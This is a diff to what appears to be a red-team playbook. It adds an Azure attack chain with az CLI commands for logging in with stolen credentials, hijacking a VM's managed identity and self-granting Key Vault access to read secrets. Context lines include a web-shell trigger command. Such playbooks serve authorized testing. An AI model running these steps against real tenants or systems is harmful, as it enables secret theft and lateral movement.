@@ -78,5 +78,14 @@ Proven end-to-end paths from how real engagements actually win. Each step links 
 3. Trigger it: `curl http://T:8080/shell.jsp?cmd=id` -> shell as the service user.
 **Impact:** zero-auth network service -> RCE. Generalises to any "download-to-arbitrary-path" daemon (aria2, some CI agents, exposed backup/restore APIs) next to a webroot or a writable `authorized_keys`. See [[file-upload]] for the write-then-execute pattern, [[linux-privesc]] to escalate onward.
 
+## 12. Azure: compromised creds -> VM managed identity -> Key Vault
+**Scenario:** assumed-breach Entra creds (or a password) in an Azure tenant; the objective is another resource/secret.
+1. Auth + enumerate with the CLI, not hand-rolled REST: `az login -u <upn> -p <pass>` (ROPC), `az account list`, `az resource list`, `az vm list -d` -> find a VM with a **managed identity** and a public IP. Entra graph via [[roadtools]].
+2. Foothold the VM: a reused/compromised password on its SSH/RDP (or any RCE) -> shell on the box.
+3. Steal the identity token from IMDS: `az login --identity` (acts AS the VM's managed identity; no JSON hand-parsing) -> [[azure-managed-identity-abuse]].
+4. Enumerate the MI's power: `az role assignment list --assignee <mi-oid> --all`. Over-permissioned (Owner/Contributor) MIs see resources the user cannot.
+5. Owner on an RBAC Key Vault's RG: self-assign `Key Vault Secrets User`, read the secret, revert -> [[azure-services-keyvault]].
+**Impact:** one low-priv identity + a compute foothold -> secrets/lateral movement across the subscription. Misconfig class: over-permissioned managed identities.
+
 ## Notes
 OOB-gate every blind step (SSRF/RCE/deser). Capture creds/hosts into `targets/<eng>/` as you go; reuse loot before researching new paths. Pick the chain from what recon/fingerprints surface (next-move / `playbook.json`).
